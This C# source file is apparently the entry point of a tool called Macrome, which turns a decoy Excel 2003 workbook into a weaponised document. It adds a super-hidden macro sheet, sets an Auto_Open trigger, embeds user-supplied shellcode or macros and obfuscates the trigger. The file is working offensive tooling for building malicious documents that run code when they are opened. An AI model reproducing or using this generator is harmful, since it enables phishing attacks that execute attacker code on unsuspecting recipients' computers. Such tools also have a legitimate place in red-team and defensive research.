using System;
using System.Collections.Generic;
using System.CommandLine.DragonFruit;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using b2xtranslator.Spreadsheet.XlsFileFormat;
using b2xtranslator.Spreadsheet.XlsFileFormat.Records;
using b2xtranslator.StructuredStorage.Reader;

namespace Macrome
{

    public class Program
    { 
        public static string AssemblyDirectory
        {
            get
            {
                string codeBase = Assembly.GetExecutingAssembly().CodeBase;
                UriBuilder uri = new UriBuilder(codeBase);
                string path = Uri.UnescapeDataString(uri.Path);
                return Path.GetDirectoryName(path);
            }
        }

        /// <summary>
        /// Generate an Excel Document with a hidden macro sheet that will execute code described by the payload argument.
        /// </summary>
        /// <param name="decoyDocument">File path to the base Excel 2003 sheet that should be visible to users.</param>
        /// <param name="payload">Either binary shellcode or a newline separated list of Excel Macros to execute</param>
        /// <param name="payloadType">Specify if the payload is binary shellcode or a macro list</param>
        /// <param name="macroSheetName">The name that should be used for the macro sheet. Default is Sheet2</param>
        /// <param name="outputSheetName">The output filename used for the generated document. Default is output.xls</param>
        /// <param name="debugMode">Set this to true to make the program wait for a debugger to attach.</param>
        public static void Main(FileInfo decoyDocument = null, FileInfo payload = null, PayloadType payloadType = PayloadType.Shellcode, 
                                string macroSheetName = "Sheet2", string outputSheetName = "output.xls", bool debugMode = false)
        {
            try
            {
                if (decoyDocument == null || payload == null)
                {
                    Console.WriteLine("decoy-document and payload must be specified. Run with -h for usage instructions.");
                    return;
                }

                //Useful for remote debugging
                if (debugMode)
                {
                    Console.WriteLine("Waiting for debugger to attach");
                    while (!Debugger.IsAttached)
                    {
                        Thread.Sleep(100);
                    }
                    Console.WriteLine("Debugger attached");
                }

                Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);

                List<BiffRecord> defaultMacroSheetRecords = GetDefaultMacroSheetRecords();

                string decoyDocPath = decoyDocument.FullName;

                WorkbookStream wbs = LoadDecoyDocument(decoyDocPath);
                WorkbookEditor wbe = new WorkbookEditor(wbs);

                wbe.AddMacroSheet(defaultMacroSheetRecords, macroSheetName, BoundSheet8.HiddenState.SuperHidden);

                wbe.AddLabel("Auto_Open", 0, 0);

                List<string> macros = null;
                byte[] binaryPayload = null;

                switch (payloadType)
                {
                    case PayloadType.Shellcode:
                        macros = MacroPatterns.GetBinaryLoaderPattern(macroSheetName);
                        binaryPayload = File.ReadAllBytes(payload.FullName);
                        break;
                    case PayloadType.Macro:
                        macros = File.ReadAllLines(payload.FullName).ToList();
                        break;
                    default:
                        throw new ArgumentException(string.Format("Invalid PayloadType {0}", payloadType),
                            "payloadType");
                }

                wbe.SetMacroSheetContent(macros, binaryPayload);

                wbe.ObfuscateAutoOpen();

                ExcelDocWriter writer = new ExcelDocWriter();
                string outputPath = AssemblyDirectory + Path.DirectorySeparatorChar + outputSheetName;
                Console.WriteLine("Writing document to {0}", outputPath);
                writer.WriteDocument(outputPath, wbe.WbStream);
            }
            catch (Exception e)
            {
                Console.WriteLine("Unexpected Exception Occurred:\n");
                Console.WriteLine(e);
            }
        }

        private static WorkbookStream LoadDecoyDocument(string decoyDocPath)
        {
            using (var fs = new FileStream(decoyDocPath, FileMode.Open))
            {
                StructuredStorageReader ssr = new StructuredStorageReader(fs);
                var wbStream = ssr.GetStream("Workbook");
                byte[] wbBytes = new byte[wbStream.Length];
                wbStream.Read(wbBytes, 0, wbBytes.Length, 0);
                WorkbookStream wbs = new WorkbookStream(wbBytes);
                return wbs;
            }
        }

        private static List<BiffRecord> GetDefaultMacroSheetRecords()
        {
            string defaultMacroPath = AssemblyDirectory + Path.DirectorySeparatorChar + @"default_macro_template.xls";
            using (var fs = new FileStream(defaultMacroPath, FileMode.Open))
            {
                StructuredStorageReader ssr = new StructuredStorageReader(fs);
                var wbStream = ssr.GetStream("Workbook");
                byte[] wbBytes = new byte[wbStream.Length];
                wbStream.Read(wbBytes, 0, wbBytes.Length, 0);
                WorkbookStream wbs = new WorkbookStream(wbBytes);
                //The last BOF/EOF set is our Macro sheet.
                List<BiffRecord> sheetRecords = wbs.GetRecordsForBOFRecord(wbs.GetAllRecordsByType<BOF>().Last());
                return sheetRecords;
            }

        }
    }
}
